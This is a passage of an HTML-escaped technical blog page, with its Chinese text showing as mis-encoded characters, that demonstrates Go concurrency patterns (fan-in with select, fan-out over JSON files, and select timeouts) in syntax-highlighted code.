&lt;/span>&lt;span class="lnt">13
&lt;/span>&lt;span class="lnt">14
&lt;/span>&lt;span class="lnt">15
&lt;/span>&lt;span class="lnt">16
&lt;/span>&lt;span class="lnt">17
&lt;/span>&lt;span class="lnt">18
&lt;/span>&lt;span class="lnt">19
&lt;/span>&lt;span class="lnt">20
&lt;/span>&lt;span class="lnt">21
&lt;/span>&lt;span class="lnt">22
&lt;/span>&lt;span class="lnt">23
&lt;/span>&lt;span class="lnt">24
&lt;/span>&lt;span class="lnt">25
&lt;/span>&lt;span class="lnt">26
&lt;/span>&lt;span class="lnt">27
&lt;/span>&lt;span class="lnt">28
&lt;/span>&lt;span class="lnt">29
&lt;/span>&lt;span class="lnt">30
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-go" data-lang="go">&lt;span class="line">&lt;span class="cl">&lt;span class="kd">func&lt;/span> &lt;span class="nf">fanInUsingSelect&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="nx">input1&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="nx">input2&lt;/span> &lt;span class="o">&amp;lt;-&lt;/span>&lt;span class="kd">chan&lt;/span> &lt;span class="kt">string&lt;/span>&lt;span class="p">)&lt;/span> &lt;span class="o">&amp;lt;-&lt;/span>&lt;span class="kd">chan&lt;/span> &lt;span class="kt">string&lt;/span> &lt;span class="p">{&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="nx">out&lt;/span> &lt;span class="o">:=&lt;/span> &lt;span class="nb">make&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="kd">chan&lt;/span> &lt;span class="kt">string&lt;/span>&lt;span class="p">)&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="k">go&lt;/span> &lt;span class="kd">func&lt;/span>&lt;span class="p">()&lt;/span> &lt;span class="p">{&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="k">defer&lt;/span> &lt;span class="nb">close&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="nx">out&lt;/span>&lt;span class="p">)&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="k">for&lt;/span> &lt;span class="p">{&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="k">select&lt;/span> &lt;span class="p">{&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="k">case&lt;/span> &lt;span class="nx">x&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="nx">ok&lt;/span> &lt;span class="o">:=&lt;/span> &lt;span class="o">&amp;lt;-&lt;/span>&lt;span class="nx">input1&lt;/span>&lt;span class="p">:&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="k">if&lt;/span> &lt;span class="p">!&lt;/span>&lt;span class="nx">ok&lt;/span> &lt;span class="p">{&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="nx">input1&lt;/span> &lt;span class="p">=&lt;/span> &lt;span class="kc">nil&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="p">}&lt;/span> &lt;span class="k">else&lt;/span> &lt;span class="p">{&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="nx">out&lt;/span> &lt;span class="o">&amp;lt;-&lt;/span> &lt;span class="nx">x&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="p">}&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="k">case&lt;/span> &lt;span class="nx">x&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="nx">ok&lt;/span> &lt;span class="o">:=&lt;/span> &lt;span class="o">&amp;lt;-&lt;/span>&lt;span class="nx">input2&lt;/span>&lt;span class="p">:&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="k">if&lt;/span> &lt;span class="p">!&lt;/span>&lt;span class="nx">ok&lt;/span> &lt;span class="p">{&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="nx">input2&lt;/span> &lt;span class="p">=&lt;/span> &lt;span class="kc">nil&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="p">}&lt;/span> &lt;span class="k">else&lt;/span> &lt;span class="p">{&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="nx">out&lt;/span> &lt;span class="o">&amp;lt;-&lt;/span> &lt;span class="nx">x&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="p">}&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="p">}&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="k">if&lt;/span> &lt;span class="nx">input1&lt;/span> &lt;span class="o">==&lt;/span> &lt;span class="kc">nil&lt;/span> &lt;span class="o">&amp;amp;&amp;amp;&lt;/span> &lt;span class="nx">input2&lt;/span> &lt;span class="o">==&lt;/span> &lt;span class="kc">nil&lt;/span> &lt;span class="p">{&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="k">break&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="p">}&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="p">}&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="p">}()&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="k">return&lt;/span> &lt;span class="nx">out&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="p">}&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;h2 id="fan-out">Fan-Out&lt;/h2>
&lt;figure>&lt;img src="https://mincodes.com/ox-hugo/fan-out-in.svg">
&lt;/figure>
&lt;p>Fan-Out åˆšå¥½å’Œ Fan-In ç›¸åï¼Œä¸€èˆ¬å’Œ Fan-In é…åˆèµ·æ¥ä¸€èµ·ä½¿ç”¨ï¼š&lt;/p>
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt"> 1
&lt;/span>&lt;span class="lnt"> 2
&lt;/span>&lt;span class="lnt"> 3
&lt;/span>&lt;span class="lnt"> 4
&lt;/span>&lt;span class="lnt"> 5
&lt;/span>&lt;span class="lnt"> 6
&lt;/span>&lt;span class="lnt"> 7
&lt;/span>&lt;span class="lnt"> 8
&lt;/span>&lt;span class="lnt"> 9
&lt;/span>&lt;span class="lnt">10
&lt;/span>&lt;span class="lnt">11
&lt;/span>&lt;span class="lnt">12
&lt;/span>&lt;span class="lnt">13
&lt;/span>&lt;span class="lnt">14
&lt;/span>&lt;span class="lnt">15
&lt;/span>&lt;span class="lnt">16
&lt;/span>&lt;span class="lnt">17
&lt;/span>&lt;span class="lnt">18
&lt;/span>&lt;span class="lnt">19
&lt;/span>&lt;span class="lnt">20
&lt;/span>&lt;span class="lnt">21
&lt;/span>&lt;span class="lnt">22
&lt;/span>&lt;span class="lnt">23
&lt;/span>&lt;span class="lnt">24
&lt;/span>&lt;span class="lnt">25
&lt;/span>&lt;span class="lnt">26
&lt;/span>&lt;span class="lnt">27
&lt;/span>&lt;span class="lnt">28
&lt;/span>&lt;span class="lnt">29
&lt;/span>&lt;span class="lnt">30
&lt;/span>&lt;span class="lnt">31
&lt;/span>&lt;span class="lnt">32
&lt;/span>&lt;span class="lnt">33
&lt;/span>&lt;span class="lnt">34
&lt;/span>&lt;span class="lnt">35
&lt;/span>&lt;span class="lnt">36
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-go" data-lang="go">&lt;span class="line">&lt;span class="cl">&lt;span class="kd">func&lt;/span> &lt;span class="nf">processJsonFiles&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="nx">ch&lt;/span> &lt;span class="o">&amp;lt;-&lt;/span>&lt;span class="kd">chan&lt;/span> &lt;span class="kt">string&lt;/span>&lt;span class="p">)&lt;/span> &lt;span class="o">&amp;lt;-&lt;/span>&lt;span class="kd">chan&lt;/span> &lt;span class="kt">string&lt;/span> &lt;span class="p">{&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="nx">out&lt;/span> &lt;span class="o">:=&lt;/span> &lt;span class="nb">make&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="kd">chan&lt;/span> &lt;span class="kt">string&lt;/span>&lt;span class="p">)&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="k">go&lt;/span> &lt;span class="kd">func&lt;/span>&lt;span class="p">()&lt;/span> &lt;span class="p">{&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="k">defer&lt;/span> &lt;span class="nb">close&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="nx">out&lt;/span>&lt;span class="p">)&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="k">for&lt;/span> &lt;span class="nx">s&lt;/span> &lt;span class="o">:=&lt;/span> &lt;span class="k">range&lt;/span> &lt;span class="nx">ch&lt;/span> &lt;span class="p">{&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="c1">// do something useful ...
&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c1">&lt;/span> &lt;span class="nx">out&lt;/span> &lt;span class="o">&amp;lt;-&lt;/span> &lt;span class="nx">s&lt;/span> &lt;span class="o">+&lt;/span> &lt;span class="s">&amp;#34; done&amp;#34;&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="p">}&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="p">}()&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="k">return&lt;/span> &lt;span class="nx">out&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="p">}&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="kd">func&lt;/span> &lt;span class="nf">fanOut&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="nx">in&lt;/span> &lt;span class="o">&amp;lt;-&lt;/span>&lt;span class="kd">chan&lt;/span> &lt;span class="kt">string&lt;/span>&lt;span class="p">)&lt;/span> &lt;span class="o">&amp;lt;-&lt;/span>&lt;span class="kd">chan&lt;/span> &lt;span class="kt">string&lt;/span> &lt;span class="p">{&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="c1">// åŒæ—¶å¼€ n ä¸ª goroutine æ¥å¤„ç†è¿™äº› json files
&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c1">&lt;/span> &lt;span class="nx">n&lt;/span> &lt;span class="o">:=&lt;/span> &lt;span class="mi">20&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="nx">cs&lt;/span> &lt;span class="o">:=&lt;/span> &lt;span class="nb">make&lt;/span>&lt;span class="p">([]&lt;/span>&lt;span class="o">&amp;lt;-&lt;/span>&lt;span class="kd">chan&lt;/span> &lt;span class="kt">string&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="nx">n&lt;/span>&lt;span class="p">)&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="k">for&lt;/span> &lt;span class="nx">i&lt;/span> &lt;span class="o">:=&lt;/span> &lt;span class="mi">0&lt;/span>&lt;span class="p">;&lt;/span> &lt;span class="nx">i&lt;/span> &lt;span class="p">&amp;lt;&lt;/span> &lt;span class="nx">n&lt;/span>&lt;span class="p">;&lt;/span> &lt;span class="nx">i&lt;/span>&lt;span class="o">++&lt;/span> &lt;span class="p">{&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="nx">cs&lt;/span>&lt;span class="p">[&lt;/span>&lt;span class="nx">i&lt;/span>&lt;span class="p">]&lt;/span> &lt;span class="p">=&lt;/span> &lt;span class="nf">processJsonFiles&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="nx">in&lt;/span>&lt;span class="p">)&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="p">}&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="nx">out&lt;/span> &lt;span class="o">:=&lt;/span> &lt;span class="nf">fanIn&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="nx">cs&lt;/span>&lt;span class="o">...&lt;/span>&lt;span class="p">)&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="k">return&lt;/span> &lt;span class="nx">out&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="p">}&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="kd">func&lt;/span> &lt;span class="nf">main&lt;/span>&lt;span class="p">()&lt;/span> &lt;span class="p">{&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="nx">ch&lt;/span> &lt;span class="o">:=&lt;/span> &lt;span class="nf">walkJsonFiles&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="s">&amp;#34;./&amp;#34;&lt;/span>&lt;span class="p">)&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="nx">out&lt;/span> &lt;span class="o">:=&lt;/span> &lt;span class="nf">fanOut&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="nx">ch&lt;/span>&lt;span class="p">)&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="k">for&lt;/span> &lt;span class="nx">s&lt;/span> &lt;span class="o">:=&lt;/span> &lt;span class="k">range&lt;/span> &lt;span class="nx">out&lt;/span> &lt;span class="p">{&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="nx">fmt&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nf">Println&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="nx">s&lt;/span>&lt;span class="p">)&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="p">}&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="p">}&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;h2 id="select-å®ç°-timeout">select å®ç° Timeout&lt;/h2>
&lt;p>&lt;a id="code-snippet--select-timeout">&lt;/a>&lt;/p>
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt"> 1
&lt;/span>&lt;span class="lnt"> 2
&lt;/span>&lt;span class="lnt"> 3
&lt;/span>&lt;span class="lnt"> 4
&lt;/span>&lt;span class="lnt"> 5
&lt;/span>&lt;span class="lnt"> 6
&lt;/span>&lt;span class="lnt"> 7
&lt;/span>&lt;span class="lnt"> 8
&lt;/span>&lt;span class="lnt"> 9
&lt;/span>&lt;span class="lnt">10
&lt;/span>&lt;span class="lnt">11
&lt;/span>&lt;span class="lnt">12
&lt;/span>&lt;span class="lnt">13
&lt;/span>&lt;span class="lnt">14
&lt;/span>&lt;span class="lnt">15
&lt;/span>&lt;span class="lnt">16
&lt;/span>&lt;span class="lnt">17
&lt;/span>&lt;span class="lnt">18
&lt;/span>&lt;span class="lnt">19
&lt;/span>&lt;span class="lnt">20
&lt;/span>&lt;span class="lnt">21
&lt;/span>&lt;span class="lnt">22
&lt;/span>&lt;span class="lnt">23
&lt;/span>&lt;span class="lnt">24
&lt;/span>&lt;span class="lnt">25
&lt;/span>&lt;span class="lnt">26
&lt;/span>&lt;span class="lnt">27
&lt;/span>&lt;span class="lnt">28
&lt;/span>&lt;span class="lnt">29
&lt;/span>&lt;span class="lnt">30
&lt;/span>&lt;span class="lnt">31
&lt;/span>&lt;span class="lnt">32
&lt;/span>&lt;span class="lnt">33
&lt;/span>&lt;span class="lnt">34
&lt;/span>&lt;span class="lnt">35
&lt;/span>&lt;span class="lnt">36
&lt;/span>&lt;span class="lnt">37
&lt;/span>&lt;span class="lnt">38
&lt;/span>&lt;span class="lnt">39
&lt;/span>&lt;span class="lnt">40
&lt;/span>&lt;span class="lnt">41
&lt;/span>&lt;span class="lnt">42
&lt;/span>&lt;span class="lnt">43
&lt;/span>&lt;span class="lnt">44
&lt;/span>&lt;span class="lnt">45
&lt;/span>&lt;span class="lnt">46
&lt;/span>&lt;span class="lnt">47
&lt;/span>&lt;span class="lnt">48
&lt;/span>&lt;span class="lnt">49
&lt;/span>&lt;span class="lnt">50
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-go" data-lang="go">&lt;span class="line">&lt;span class="cl">&lt;span class="kn">package&lt;/span> &lt;span class="nx">main&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="kn">import&lt;/span> &lt;span class="p">(&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="s">&amp;#34;fmt&amp;#34;&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="s">&amp;#34;time&amp;#34;&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="p">)&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c1">// ä¸ºæ¯æ¬¡ select è®¾ç½®è¶…æ—¶
&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c1">// æ¯æ¬¡ select éƒ½ä¼šé‡ç½®è¶…æ—¶
&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c1">&lt;/span>&lt;span class="kd">func&lt;/span> &lt;span class="nf">selectTimeout&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="nx">in&lt;/span> &lt;span class="o">&amp;lt;-&lt;/span>&lt;span class="kd">chan&lt;/span> &lt;span class="kt">string&lt;/span>&lt;span class="p">)&lt;/span> &lt;span class="p">{&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="k">for&lt;/span> &lt;span class="p">{&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="k">select&lt;/span> &lt;span class="p">{&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="k">case&lt;/span> &lt;span class="nx">s&lt;/span> &lt;span class="o">:=&lt;/span> &lt;span class="o">&amp;lt;-&lt;/span>&lt;span class="nx">in&lt;/span>&lt;span class="p">:&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="nx">fmt&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nf">Println&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="s">&amp;#34;tick&amp;#34;&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="nx">s&lt;/span>&lt;span class="p">)&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="k">case&lt;/span> &lt;span class="o">&amp;lt;-&lt;/span> &lt;span class="nx">time&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nf">After&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="mi">1&lt;/span> &lt;span class="o">*&lt;/span> &lt;span class="nx">time&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nx">Second&lt;/span>&lt;span class="p">):&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="nx">fmt&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nf">Println&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="s">&amp;#34;You&amp;#39;re too slow.&amp;#34;&lt;/span>&lt;span class="p">)&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="k">return&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="p">}&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="p">}&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="p">}&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c1">// ä¸ºæ•´ä¸ª for å¾ªç¯è®¾ç½®ä¸€ä¸ªè¶…æ—¶ï¼Œæ—¶é—´ç»“æŸå³é€€å‡º
&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c1">&lt;/span>&lt;span class="kd">func&lt;/span> &lt;span class="nf">selectTimeout2&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="nx">in&lt;/span> &lt;span class="o">&amp;lt;-&lt;/span>&lt;span class="kd">chan&lt;/span> &lt;span class="kt">string&lt;/span>&lt;span class="p">)&lt;/span> &lt;span class="p">{&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="nx">timeout&lt;/span> &lt;span class="o">:=&lt;/span> &lt;span class="nx">time&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nf">After&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="mi">1&lt;/span> &lt;span class="o">*&lt;/span> &lt;span class="nx">time&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nx">Second&lt;/span>&lt;span class="p">)&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="k">for&lt;/span> &lt;span class="p">{&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="k">select&lt;/span> &lt;span class="p">{&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="k">case&lt;/span> &lt;span class="nx">s&lt;/span> &lt;span class="o">:=&lt;/span> &lt;span class="o">&amp;lt;-&lt;/span>&lt;span class="nx">in&lt;/span>&lt;span class="p">:&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="nx">fmt&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nf">Println&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="s">&amp;#34;tock&amp;#34;&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="nx">s&lt;/span>&lt;span class="p">)&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="k">case&lt;/span> &lt;span class="o">&amp;lt;-&lt;/span> &lt;span class="nx">timeout&lt;/span>&lt;span class="p">:&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="nx">fmt&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nf">Println&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="s">&amp;#34;timed out&amp;#34;&lt;/span>&lt;span class="p">)&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="k">return&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="p">}&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="p">}&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="p">}&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="kd">func&lt;/span> &lt;span class="nf">main&lt;/span>&lt;span class="p">()&lt;/span> &lt;span class="p">{&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="nx">in&lt;/span> &lt;span class="o">:=&lt;/span> &lt;span class="nb">make&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="kd">chan&lt;/span> &lt;span class="kt">string&lt;/span>&lt;span class="p">)&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="k">go&lt;/span> &lt;span class="kd">func&lt;/span>&lt;span class="p">()&lt;/span> &lt;span class="p">{&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="k">for&lt;/span> &lt;span class="nx">i&lt;/span> &lt;span class="o">:=&lt;/span> &lt;span class="mi">0&lt;/span>&lt;span class="p">;&lt;/span> &lt;span class="nx">i&lt;/span> &lt;span class="p">&amp;lt;&lt;/span> &lt;span class="mi">20&lt;/span>&lt;span class="p">;&lt;/span> &lt;span class="nx">i&lt;/span>&lt;span class="o">++&lt;/span> &lt;span class="p">{&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="nx">time&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nf">Sleep&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="nx">time&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nf">Duration&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="nx">i&lt;/span> &lt;span class="o">*&lt;/span> &lt;span class="mi">200&lt;/span>&lt;span class="p">)&lt;/span> &lt;span class="o">*&lt;/span> &lt;span class="nx">time&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nx">Millisecond&lt;/span>&lt;span class="p">)&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="nx">in&lt;/span> &lt;span class="o">&amp;lt;-&lt;/span> &lt;span class="nx">fmt&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nf">Sprintf&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="s">&amp;#34;%d&amp;#34;&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="nx">i&lt;/span>&lt;span class="p">)&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="p">}&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="p">}()&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="k">go&lt;/span> &lt;span class="nf">selectTimeout2&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="nx">in&lt;/span>&lt;span class="p">)&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="nf">selectTimeout&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="nx">in&lt;/span>&lt;span class="p">)&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="p">}&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;p>è¾“å‡ºå¦‚ä¸‹ï¼š&lt;/p>
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
&lt;/span>&lt;span class="lnt">2
&lt;/span>&lt;span class="lnt">3
&lt;/span>&lt;span class="lnt">4
&lt;/span>&lt;span class="lnt">5
&lt;/span>&lt;span class="lnt">6
&lt;/span>&lt;span class="lnt">7
